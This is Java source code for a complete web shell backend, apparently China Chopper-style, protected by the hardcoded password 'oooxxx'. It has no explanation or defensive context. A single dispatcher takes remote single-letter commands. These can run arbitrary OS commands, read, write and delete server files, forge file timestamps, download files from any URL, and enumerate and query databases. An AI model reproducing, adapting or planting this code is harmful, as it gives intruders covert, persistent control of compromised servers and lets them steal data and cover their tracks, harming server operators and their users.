/**
 * Created by zxmoa on 14-8-25.
 */

import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.ResultSetMetaData;
import java.sql.Statement;
import java.text.SimpleDateFormat;


public class Ch {

    private static final long serialVersionUID = 1L;

    private static  String Pwd = "oooxxx";
    private static String cs = "UTF-8";

   static String EC(String s) throws Exception {
        return new String(s.getBytes("ISO-8859-1"),cs);
    }

    static Connection GC(String s) throws Exception {
        String[] x = s.trim().split("\r\n");
        Class.forName(x[0].trim());
        if(x[1].indexOf("jdbc:oracle")!=-1){
            return DriverManager.getConnection(x[1].trim()+":"+x[4],x[2].equalsIgnoreCase("[/null]")?"":x[2],x[3].equalsIgnoreCase("[/null]")?"":x[3]);
        }else{
            Connection c = DriverManager.getConnection(x[1].trim(),x[2].equalsIgnoreCase("[/null]")?"":x[2],x[3].equalsIgnoreCase("[/null]")?"":x[3]);
            if (x.length > 4) {
                c.setCatalog(x[4]);
            }
            return c;
        }
    }

    static void AA(StringBuffer sb) throws Exception {
        File r[] = File.listRoots();
        for (int i = 0; i < r.length; i++) {
            sb.append(r[i].toString().substring(0, 2));
        }
    }

    static void BB(String s, StringBuffer sb) throws Exception {
        File oF = new File(s), l[] = oF.listFiles();
        String sT, sQ, sF = "";
        java.util.Date dt;
        SimpleDateFormat fm = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
        for (int i = 0; i < l.length; i++) {
            dt = new java.util.Date(l[i].lastModified());
            sT = fm.format(dt);
            sQ = l[i].canRead() ? "R" : "";
            sQ += l[i].canWrite() ? " W" : "";
            if (l[i].isDirectory()) {
                sb.append(l[i].getName() + "/\t" + sT + "\t" + l[i].length()+ "\t" + sQ + "\n");
            } else {
                sF+=l[i].getName() + "\t" + sT + "\t" + l[i].length() + "\t"+ sQ + "\n";
            }
        }
        sb.append(sF);
    }

    static void EE(String s) throws Exception {
        File f = new File(s);
        if (f.isDirectory()) {
            File x[] = f.listFiles();
            for (int k = 0; k < x.length; k++) {
                if (!x[k].delete()) {
                    EE(x[k].getPath());
                }
            }
        }
        f.delete();
    }

    static  void FF(String s, OutputStream os) throws Exception {
        int n;
        byte[] b = new byte[512];
        BufferedInputStream is = new BufferedInputStream(new FileInputStream(s));
        os.write(("->" + "|").getBytes(), 0, 3);
        while ((n = is.read(b, 0, 512)) != -1) {
            os.write(b, 0, n);
        }
        os.write(("|" + "<-").getBytes(), 0, 3);
        os.close();
        is.close();
    }

    static void GG(String s, String d) throws Exception {
        String h = "0123456789ABCDEF";
        File f = new File(s);
        f.createNewFile();
        FileOutputStream os = new FileOutputStream(f);
        for (int i = 0; i < d.length(); i += 2) {
            os.write((h.indexOf(d.charAt(i)) << 4 | h.indexOf(d.charAt(i + 1))));
        }
        os.close();
    }

    static void HH(String s, String d) throws Exception {
        File sf = new File(s), df = new File(d);
        if (sf.isDirectory()) {
            if (!df.exists()) {
                df.mkdir();
            }
            File z[] = sf.listFiles();
            for (int j = 0; j < z.length; j++) {
                HH(s + "/" + z[j].getName(), d + "/" + z[j].getName());
            }
        } else {
            FileInputStream is = new FileInputStream(sf);
            FileOutputStream os = new FileOutputStream(df);
            int n;
            byte[] b = new byte[512];
            while ((n = is.read(b, 0, 512)) != -1) {
                os.write(b, 0, n);
            }
            is.close();
            os.close();
        }
    }

    static void II(String s, String d) throws Exception {
        File sf = new File(s), df = new File(d);
        sf.renameTo(df);
    }

    static  void JJ(String s) throws Exception {
        File f = new File(s);
        f.mkdir();
    }

    static void KK(String s, String t) throws Exception {
        File f = new File(s);
        SimpleDateFormat fm = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
        java.util.Date dt = fm.parse(t);
        f.setLastModified(dt.getTime());
    }

    static  void LL(String s, String d) throws Exception {
        URL u = new URL(s);
        int n = 0;
        FileOutputStream os = new FileOutputStream(d);
        HttpURLConnection h = (HttpURLConnection) u.openConnection();
        InputStream is = h.getInputStream();
        byte[] b = new byte[512];
        while ((n = is.read(b)) != -1) {
            os.write(b, 0, n);
        }
        os.close();
        is.close();
        h.disconnect();
    }

    static  void MM(InputStream is, StringBuffer sb) throws Exception {
        String l;
        BufferedReader br = new BufferedReader(new InputStreamReader(is));
        while ((l = br.readLine()) != null) {
            sb.append(l + "\r\n");
        }
    }

    static  void NN(String s, StringBuffer sb) throws Exception {
        Connection c = GC(s);
        ResultSet r = s.indexOf("jdbc:oracle")!=-1?c.getMetaData().getSchemas():c.getMetaData().getCatalogs();
        while (r.next()) {
            sb.append(r.getString(1) + "\t");
        }
        r.close();
        c.close();
    }

    static void OO(String s, StringBuffer sb) throws Exception {
        Connection c = GC(s);
        String[] x = s.trim().split("\r\n");
        ResultSet r = c.getMetaData().getTables(null,s.indexOf("jdbc:oracle")!=-1?x.length>5?x[5]:x[4]:null, "%", new String[]{"TABLE"});
        while (r.next()) {
            sb.append(r.getString("TABLE_NAME") + "\t");
        }
        r.close();
        c.close();
    }

    static void PP(String s, StringBuffer sb) throws Exception {
        String[] x = s.trim().split("\r\n");
        Connection c = GC(s);
        Statement m = c.createStatement(1005, 1007);
        ResultSet r = m.executeQuery("select * from " + x[x.length-1]);
        ResultSetMetaData d = r.getMetaData();
        for (int i = 1; i <= d.getColumnCount(); i++) {
            sb.append(d.getColumnName(i) + " (" + d.getColumnTypeName(i)+ ")\t");
        }
        r.close();
        m.close();
        c.close();
    }

    static  void QQ(String cs, String s, String q, StringBuffer sb,String p) throws Exception {
        Connection c = GC(s);
        Statement m = c.createStatement(1005, 1008);
        BufferedWriter bw = null;
        try {
            ResultSet r = m.executeQuery(q.indexOf("--f:")!=-1?q.substring(0,q.indexOf("--f:")):q);
            ResultSetMetaData d = r.getMetaData();
            int n = d.getColumnCount();
            for (int i = 1; i <= n; i++) {
                sb.append(d.getColumnName(i) + "\t|\t");
            }
            sb.append("\r\n");
            if(q.indexOf("--f:")!=-1){
                File file = new File(p);
                if(q.indexOf("-to:")==-1){
                    file.mkdir();
                }
                bw = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(new File(q.indexOf("-to:")!=-1?p.trim():p+q.substring(q.indexOf("--f:") + 4,q.length()).trim()),true),cs));
            }
            while (r.next()) {
                for (int i = 1; i <= n; i++) {
                    if(q.indexOf("--f:")!=-1){
                        bw.write(r.getObject(i)+""+"\t");
                        bw.flush();
                    }else{
                        sb.append(r.getObject(i)+"" + "\t|\t");
                    }
                }
                if(bw!=null){bw.newLine();}
                sb.append("\r\n");
            }
            r.close();
            if(bw!=null){bw.close();}
        } catch (Exception e) {
            sb.append("Result\t|\t\r\n");
            try {
                m.executeUpdate(q);
                sb.append("Execute Successfully!\t|\t\r\n");
            } catch (Exception ee) {
                sb.append(ee.toString() + "\t|\t\r\n");
            }
        }
        m.close();
        c.close();
    }


    public  static void  go(String code, String zz1,String zz2,String pwd,String path,OutputStream os) throws IOException {

      // System.out.println(code + "\nzz1:" + zz1 +"\nzz2:"+zz2+"" +"\npwd:"+pwd+"\npaht:"+path);
        cs =code != null ? code:cs;
        ////response.setContentType("text/html");
        //response.setCharacterEncoding(cs);
        //PrintWriter out = response.getWriter();
        StringBuffer sb = new StringBuffer("");
        try {
            String Z = EC(pwd + "");
            String z1 = EC(zz1 + "");
            String z2 = EC(zz2 + "");
            sb.append("->" + "|");
            String s =path;
            if (Z.equals("A")) {
                sb.append(s + "\t");
                if (!s.substring(0, 1).equals("/")) {
                    AA(sb);
                }
            } else if (Z.equals("B")) {
                BB(z1, sb);
            } else if (Z.equals("C")) {
                String l = "";
                BufferedReader br = new BufferedReader(new InputStreamReader(new FileInputStream(new File(z1))));
                while ((l = br.readLine()) != null) {
                    sb.append(l + "\r\n");
                }
                br.close();
            } else if (Z.equals("D")) {
                BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(new File(z1))));
                bw.write(z2);
                bw.close();
                sb.append("1");
            } else if (Z.equals("E")) {
                EE(z1);
                sb.append("1");
            } else if (Z.equals("F")) {
                FF(z1, os);
                return;
            } else if (Z.equals("G")) {
                GG(z1, z2);
                sb.append("1");
            } else if (Z.equals("H")) {
                HH(z1, z2);
                sb.append("1");
            } else if (Z.equals("I")) {
                II(z1, z2);
                sb.append("1");
            } else if (Z.equals("J")) {
                JJ(z1);
                sb.append("1");
            } else if (Z.equals("K")) {
                KK(z1, z2);
                sb.append("1");
            } else if (Z.equals("L")) {
                LL(z1, z2);
                sb.append("1");
            } else if (Z.equals("M")) {
                String[] c = { z1.substring(2), z1.substring(0, 2), z2 };
                Process p = Runtime.getRuntime().exec(c);
                MM(p.getInputStream(), sb);
                MM(p.getErrorStream(), sb);
            } else if (Z.equals("N")) {
                NN(z1, sb);
            } else if (Z.equals("O")) {
                OO(z1, sb);
            } else if (Z.equals("P")) {
                PP(z1, sb);
            } else if (Z.equals("Q")) {
                QQ(cs, z1, z2, sb,z2.indexOf("-to:")!=-1?z2.substring(z2.indexOf("-to:")+4,z2.length()):s.replaceAll("\\\\", "/")+"images/");
            }
        } catch (Exception e) {
            sb.append("ERROR" + ":// " + e.toString());
        }
       // System.out.println(sb.toString() );
        sb.append("|" + "<-");
        os.write(sb.toString().getBytes() );
        //out.print(sb.toString());
    }

}